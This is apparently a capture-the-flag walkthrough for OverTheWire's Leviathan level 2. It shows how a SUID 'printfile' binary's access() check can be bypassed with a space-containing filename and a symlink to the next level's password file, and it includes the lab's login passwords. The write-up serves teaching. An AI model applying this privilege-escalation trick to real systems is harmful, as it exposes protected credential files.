## Login

SSH: `ssh leviathan2@leviathan.labs.overthewire.org -p 2223`

Password: `NsN1HwFoyN`

## A little bit of Theory

In this level, we will see how we can use some uncommon inputs and differences in function inputs can be used to do privilege escalation. Specifically, we look at how white spaces in inputs can sometimes be split.

A **Link** is a symbolic pointer to a file to allow access to the file from other folders. Instead of creating a copy that, when edited, will be different to the original, a link points to the original.

## Solution

I again start by looking at the home folder content and finding a SUID binary called ‘printfile’ owned by the ’leviathan3’ user. So I again test what it does:

```bash
leviathan2@leviathan:~$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan2@leviathan:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
```

It seems like we can use the binary with a file and based on the name, it will print the content of the file. So let’s try printing the password file for the ’leviathan3’ user.

```bash
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

This does not seem to be quite as easy. It seems like we can only read a file that we have permission for. To check, I test it on a file in the home folder. We can see that it works as expected:

```bash
leviathan2@leviathan:~$ ./printfile .bash_logout 
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
```

Now, the knowledge we have so far is not enough to understand how to get the password for the next level. We need to understand the program even better.

In the previous level, we learned two commands to analyse a program. Let’s see what we can find out with `ltrace`.

```bash
leviathan2@leviathan:~$ ltrace ./printfile .bash_logout
__libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 <unfinished ...>
access(".bash_logout", 4)                                              = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout")  = 21
geteuid()                                                              = 12002
geteuid()                                                              = 12002
setreuid(12002, 12002)                                                 = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                 = 0
+++ exited (status 0) +++
```

So first, the access function is called, which checks if the user is allowed to access the file (in this case, the user is ’leviathan2’). The change of the user ID is only done later on. We can also see that `/bin/cat` is called to print the file.

Now we can try and see what potential unexpected input can do. Let’s see, what would happen, if we input two files:

```bash
leviathan2@leviathan:~$ mktemp -d
/tmp/tmp.BykcxJXZxD
leviathan2@leviathan:~$ touch /tmp/tmp.BykcxJXZxD/"test file.txt"
leviathan2@leviathan:~$ ls -la /tmp/tmp.BykcxJXZxD
total 228
drwx--S---   2 leviathan2 root   4096 Jul  5 09:03 .
drwxrws-wt 181 root       root 225280 Jul  5 09:02 ..
-rw-r--r--   1 leviathan2 root      0 Jul  5 09:03 test file.txt
leviathan2@leviathan:~$ ltrace ./printfile /tmp/tmp.BykcxJXZxD/"test file.txt"
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/tmp/tmp.BykcxJXZxD/test file.tx"..., 4)                       = 0
snprintf("/bin/cat /tmp/tmp.BykcxJXZxD/tes"..., 511, "/bin/cat %s", "/tmp/tmp.BykcxJXZxD/test file.tx"...) = 42
geteuid()                                                              = 12002
geteuid()                                                              = 12002
setreuid(12002, 12002)                                                 = 0
system("/bin/cat /tmp/tmp.BykcxJXZxD/tes".../bin/cat: /tmp/tmp.BykcxJXZxD/test: No such file or directory
/bin/cat: file.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                 = 256
+++ exited (status 0) +++
```

So, the access function looks at the whole file name, therefore allowing us to read the file. However, the ‘/bin/cat’ only gets part of the file name, specifically, everything before the space.

Now, we can create a file called ’test’ that links to the password file and give the ’leviathan3’ user permission to access the directory. This way the binary does call the password file and we evaded the check.

```bash
leviathan2@leviathan:~$ clear
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.BykcxJXZxD/test
leviathan2@leviathan:~$ ls -la /tmp/tmp.BykcxJXZxD
total 228
drwx--S---   2 leviathan2 root   4096 Jul  5 09:11 .
drwxrws-wt 181 root       root 225280 Jul  5 09:10 ..
lrwxrwxrwx   1 leviathan2 root     30 Jul  5 09:11 test -> /etc/leviathan_pass/leviathan3
-rw-r--r--   1 leviathan2 root      0 Jul  5 09:03 test file.txt
leviathan2@leviathan:~$ chmod 777 /tmp/tmp.BykcxJXZxD
leviathan2@leviathan:~$ ./printfile /tmp/tmp.BykcxJXZxD/"test file.txt"
f0n8h2iWLP
/bin/cat: file.txt: No such file or directory
```

---
### Official Level Link

[Leviathan Level 3](https://overthewire.org/wargames/leviathan/leviathan3.html)